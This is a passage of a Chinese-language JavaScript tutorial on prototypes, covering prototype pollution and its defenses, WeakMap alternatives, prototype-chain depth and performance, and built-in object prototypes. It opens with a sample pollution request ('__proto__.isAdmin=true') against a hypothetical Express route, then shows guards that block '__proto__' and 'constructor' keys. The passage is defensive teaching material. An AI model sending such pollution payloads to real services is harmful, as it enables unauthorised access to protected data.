class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 假设Express中有这样的代码</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">query</span>.<span class="hljs-property">isAdmin</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sensitiveData</span>();<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// 攻击者可以发送污染请求</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/user?__proto__.isAdmin=true&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="7-2-如何防御原型污染？"><a href="#7-2-如何防御原型污染？" class="headerlink" title="7.2 如何防御原型污染？"></a>7.2 如何防御原型污染？</h2><p>（1）使用 Object.create(null)创建纯净对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> safeObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br>safeObj.<span class="hljs-property">a</span> = <span class="hljs-number">1</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(safeObj.<span class="hljs-property">hasOwnProperty</span>); <span class="hljs-comment">// undefined</span><br></code></pre></td></tr></table></figure><p>（2）安全的对象合并</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">safeMerge</span>(<span class="hljs-params">target, source</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(&#123;&#125;, target, source);<br>  <span class="hljs-comment">// 或使用展开运算符</span><br>  <span class="hljs-comment">// return &#123; ...target, ...source &#125;;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（3）原型属性检查</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setValue</span>(<span class="hljs-params">obj, path, value</span>) &#123;<br>  <span class="hljs-keyword">const</span> parts = path.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>);<br>  <span class="hljs-keyword">let</span> current = obj;<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; parts.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (parts[i] === <span class="hljs-string">&#x27;__proto__&#x27;</span> || parts[i] === <span class="hljs-string">&#x27;constructor&#x27;</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Prototype pollution attempt&#x27;</span>);<br>    &#125;<br>    <span class="hljs-comment">// ...其余逻辑</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>（4）使用 Map 代替 Object</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> safeMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br>safeMap.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>);<br><span class="hljs-comment">// 无法通过原型链污染</span><br></code></pre></td></tr></table></figure><p>（5）冻结原型</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">isAdmin</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 在严格模式下会报错</span><br></code></pre></td></tr></table></figure><h2 id="7-3-使用-WeakMap-替代原型扩展"><a href="#7-3-使用-WeakMap-替代原型扩展" class="headerlink" title="7.3 使用 WeakMap 替代原型扩展"></a>7.3 使用 <code>WeakMap</code> 替代原型扩展</h2><p><strong>传统原型扩展存在的问题</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 向原型添加方法</span><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">last</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];<br>&#125;;<br><br><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">last</span>()); <span class="hljs-comment">// 3</span><br></code></pre></td></tr></table></figure><p>（1）全局污染：影响所有同类对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> []) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key); <span class="hljs-comment">// 会输出 &quot;last&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（2）命名冲突</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">last</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;A&#x27;</span> &#125;;<br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">last</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;B&#x27;</span> &#125;; <span class="hljs-comment">// 被覆盖</span><br></code></pre></td></tr></table></figure><p>（3）安全风险</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 恶意代码可能修改原生方法</span><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">map</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* 恶意操作 */</span> &#125;;<br></code></pre></td></tr></table></figure><p><strong>替代方案</strong></p><p>（1）私有数据存储模式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> privateData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    privateData.<span class="hljs-title function_">set</span>(<span class="hljs-variable language_">this</span>, &#123; name &#125;);<br>  &#125;<br>  <br>  <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> privateData.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">name</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-title function_">getName</span>()); <span class="hljs-comment">// &quot;Alice&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">name</span>);      <span class="hljs-comment">// undefined</span><br></code></pre></td></tr></table></figure><p>（2）方法扩展替代方案</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> arrayExtensions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">extendArray</span>(<span class="hljs-params">arr</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!arrayExtensions.<span class="hljs-title function_">has</span>(arr)) &#123;<br>    arrayExtensions.<span class="hljs-title function_">set</span>(arr, &#123;<br>      <span class="hljs-attr">last</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];<br>      &#125;<br>    &#125;);<br>    <br>    <span class="hljs-comment">// 将方法绑定到实例</span><br>    arr.<span class="hljs-property">last</span> = arrayExtensions.<span class="hljs-title function_">get</span>(arr).<span class="hljs-property">last</span>.<span class="hljs-title function_">bind</span>(arr);<br>  &#125;<br>  <span class="hljs-keyword">return</span> arr;<br>&#125;<br><br><span class="hljs-keyword">const</span> myArr = <span class="hljs-title function_">extendArray</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myArr.<span class="hljs-title function_">last</span>()); <span class="hljs-comment">// 3</span><br><br><span class="hljs-comment">// 不影响其他数组</span><br><span class="hljs-keyword">const</span> normalArr = [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(normalArr.<span class="hljs-property">last</span>); <span class="hljs-comment">// undefined</span><br></code></pre></td></tr></table></figure><p>（3）元数据关联模式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> metadata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addMetadata</span>(<span class="hljs-params">obj, data</span>) &#123;<br>  metadata.<span class="hljs-title function_">set</span>(obj, data);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getMetadata</span>(<span class="hljs-params">obj</span>) &#123;<br>  <span class="hljs-keyword">return</span> metadata.<span class="hljs-title function_">get</span>(obj);<br>&#125;<br><br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-title function_">addMetadata</span>(obj, &#123; <span class="hljs-attr">created</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getMetadata</span>(obj)); <span class="hljs-comment">// &#123; created: 162... &#125;</span><br></code></pre></td></tr></table></figure><h2 id="7-4-性能优化：减少原型链深度"><a href="#7-4-性能优化：减少原型链深度" class="headerlink" title="7.4 性能优化：减少原型链深度"></a>7.4 性能优化：减少原型链深度</h2><p><strong>原型链深度对性能的影响机制</strong></p><ul><li>属性查找：每级原型链增加 10% ～ 20% 的查找时间（V8 引擎数据）</li><li>缓存失效：现代 JavaScript 引擎的隐藏类优化会被过深原型链破坏</li><li>内存占用：每级原型链需要额外的内存存储引用</li></ul><p><strong>测试原型链深度的影响</strong></p><p>基准测试用例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 创建不同深度的原型链</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createChain</span>(<span class="hljs-params">depth</span>) &#123;<br>  <span class="hljs-keyword">let</span> current = &#123;&#125;;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; depth; i++) &#123;<br>    <span class="hljs-keyword">const</span> newObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(current);<br>    newObj[<span class="hljs-string">`prop<span class="hljs-subst">$&#123;i&#125;</span>`</span>] = i;<br>    current = newObj;<br>  &#125;<br>  <span class="hljs-keyword">return</span> current;<br>&#125;<br><br><span class="hljs-comment">// 测试属性访问速度</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">testAccess</span>(<span class="hljs-params">obj, prop</span>) &#123;<br>  <span class="hljs-keyword">const</span> start = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000</span>; i++) &#123;<br>    obj[prop];<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - start;<br>&#125;<br><br><span class="hljs-keyword">const</span> depths = [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>];<br>depths.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">depth</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> obj = <span class="hljs-title function_">createChain</span>(depth);<br>  <span class="hljs-keyword">const</span> time = <span class="hljs-title function_">testAccess</span>(obj, <span class="hljs-string">`prop<span class="hljs-subst">$&#123;depth-<span class="hljs-number">1</span>&#125;</span>`</span>);<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Depth <span class="hljs-subst">$&#123;depth&#125;</span>: <span class="hljs-subst">$&#123;time.toFixed(<span class="hljs-number">2</span>)&#125;</span>ms`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>测试结果（Chrome 137.0.7151.120（正式版本） (x86_64)）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Depth</span> <span class="hljs-number">1</span>: <span class="hljs-number">3.</span>00ms<br><span class="hljs-title class_">Depth</span> <span class="hljs-number">3</span>: <span class="hljs-number">11.</span>00ms<br><span class="hljs-title class_">Depth</span> <span class="hljs-number">5</span>: <span class="hljs-number">12.</span>00ms<br><span class="hljs-title class_">Depth</span> <span class="hljs-number">10</span>: <span class="hljs-number">10.</span>00ms<br></code></pre></td></tr></table></figure><p><strong>优化策略</strong></p><p>（1）扁平化继承结构</p><p>优化前（传统深继承）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123; <span class="hljs-title function_">methodA</span>(<span class="hljs-params"></span>) &#123;&#125; &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">A</span> &#123; <span class="hljs-title function_">methodB</span>(<span class="hljs-params"></span>) &#123;&#125; &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">B</span> &#123; <span class="hljs-title function_">methodC</span>(<span class="hljs-params"></span>) &#123;&#125; &#125;<br><span class="hljs-comment">// 原型链：C → B → A → Object</span><br></code></pre></td></tr></table></figure><p>优化后（组合+扁平）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">methods</span> = &#123;<br>      ...<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./methodA&#x27;</span>),<br>      ...<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./methodB&#x27;</span>),<br>      ...<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./methodC&#x27;</span>)<br>    &#125;;<br>  &#125;<br>  <br>  <span class="hljs-title function_">methodA</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">methods</span>.<span class="hljs-property">methodA</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>); &#125;<br>  <span class="hljs-title function_">methodB</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">methods</span>.<span class="hljs-property">methodB</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>); &#125;<br>  <span class="hljs-title function_">methodC</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">methods</span>.<span class="hljs-property">methodC</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>); &#125;<br>&#125;<br><span class="hljs-comment">// 原型链：Base → Object</span><br></code></pre></td></tr></table></figure><p>（2）方法直接挂载实例</p><p>优化前：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = heavyData;<br>  &#125;<br>  <br>  <span class="hljs-title function_">process</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* 频繁调用的方法 */</span> &#125;<br>&#125;<br><span class="hljs-comment">// 方法在原型上，每次访问需要查链</span><br></code></pre></td></tr></table></figure><p>优化后：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = heavyData;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">process</span> = <span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">/* 直接绑定到实例 */</span> &#125;;<br>  &#125;<br>&#125;<br><span class="hljs-comment">// 首次创建成本稍高，但访问更快</span><br></code></pre></td></tr></table></figure><p>（3）使用对象组合替代继承</p><p>优化前：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123; <span class="hljs-comment">/* 基础方法 */</span> &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">User</span> &#123; <span class="hljs-comment">/* 特权方法 */</span> &#125;<br><span class="hljs-comment">// 原型链深度：2</span><br></code></pre></td></tr></table></figure><p>优化后：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> userMethods = &#123; <span class="hljs-comment">/* 基础方法 */</span> &#125;;<br><span class="hljs-keyword">const</span> adminMethods = &#123; <span class="hljs-comment">/* 特权方法 */</span> &#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createAdmin</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(&#123;&#125;, userMethods, adminMethods);<br>&#125;<br><span class="hljs-comment">// 原型链深度：0</span><br></code></pre></td></tr></table></figure><p>（4）选择性缓存高频访问方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HeavyUsedClass</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 缓存高频方法引用</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">frequentMethod</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">frequentMethod</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>  &#125;<br>  <br>  <span class="hljs-title function_">frequentMethod</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* ... */</span> &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HeavyUsedClass</span>();<br><span class="hljs-comment">// 后续调用直接使用 instance.frequentMethod() 不需要查原型链</span><br></code></pre></td></tr></table></figure><h1 id="第八章：内置对象的原型结构"><a href="#第八章：内置对象的原型结构" class="headerlink" title="第八章：内置对象的原型结构"></a>第八章：内置对象的原型结构</h1><h2 id="8-1-数组的原型链：Array-prototype"><a href="#8-1-数组的原型链：Array-prototype" class="headerlink" title="8.1 数组的原型链：Array.prototype"></a>8.1 数组的原型链：<code>Array.prototype</code></h2><p>JavaScript 中数组的原型链遵循以下层次结构</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">[实际数组实例] <br>→ Array.prototype <br>  → Object.prototype<br>    → null<br></code></pre></td></tr></table></figure><p><strong>Array.prototype 层详解 - 核心方法分类</strong></p><table><thead><tr><th align="left">方法类型</th><th align="left">示例方法</th><th align="left">ES版本</th></tr></thead><tbody><tr><td align="left">修改器方法</td><td align="left">push(), pop(), splice(), sort()</td><td align="left">ES1</td></tr><tr><td align="left">访问方法</td><td align="left">concat(), slice(), join()</td><td align="left">ES1</td></tr><tr><td align="left">迭代方法</td><td align="left">forEach(), map(), filter()</td><td align="left">ES5</td></tr><tr><td align="left">查找方法</td><td align="left">find(), findIndex(), includes()</td><td align="left">ES6+</td></tr><tr><td align="left">转换方法</td><td align="left">toString(), toLocaleString()</td><td align="left">ES1</td></tr></tbody></table><h2 id="8-2-函数的原型链：Function-prototype"><a href="#8-2-函数的原型链：Function-prototype" class="headerlink" title="8.2 函数的原型链：Function.prototype"></a>8.2 函数的原型链：<code>Function.prototype</code></h2><p><strong>函数原型链层次结构</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">[函数实例]<br>→ Function.prototype<br>  → Object.prototype<br>    → null<br></code></pre></td></tr></table></figure><p><strong>Function.prototype 层详解 - 核心方法分类</strong></p><table><thead><tr><th align="left">方法名</th><th align="left">作用描述</th><th align="left">返回类型</th></tr></thead><tbody><tr><td align="left">apply()</td><td align="left">指定this值并以数组形式传参</td><td align="left">函数返回值</td></tr><tr><td align="left">call()</td><td align="left">指定this值并逐个传参</td><td align="left">函数返回值</td></tr><tr><td align="left">bind()</td><td align="left">创建绑定this的新函数</td><td align="left">函数</td></tr><tr><td align="left">toString()</td><td align="left">返回函数源码字符串</td><td align="left">字符串</td></tr></tbody></table><p><strong>特殊行为</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Function.prototype 本身是一个函数</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// &quot;function&quot;</span><br><br><span class="hljs-comment">// 但无法正常调用</span><br><span class="hljs-keyword">try</span> &#123;<br>  <span class="hljs-title class_">Function</span>.<span class="hljs-title function_">prototype</span>();<br>&#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e); <span class="hljs-comment">// TypeError: Function.prototype requires &#x27;this&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-3-包装类型（String-Number-Boolean）的原型"><a href="#8-3-包装类型（String-Number-Boolean）的原型" class="headerlink" title="8.3 包装类型（String&#x2F;Number&#x2F;Boolean）的原型"></a>8.3 包装类型（String&#x2F;Number&#x2F;Boolean）的原型</h2><p>JavaScript 中的基本类型（string&#x2F;number&#x2F;boolean）在被当成对象使用时，会被自动转换为对应的包装对象，这些包装对象拥有各自的原型链结构</p><p><strong>String 包装类型</strong></p><p>原型链结构如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">[String实例]<br>→ String.prototype<br>  → Object.prototype<br>    → null<br></code></pre></td></tr></table></figure><p>String.prototype 的核心方法有：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code 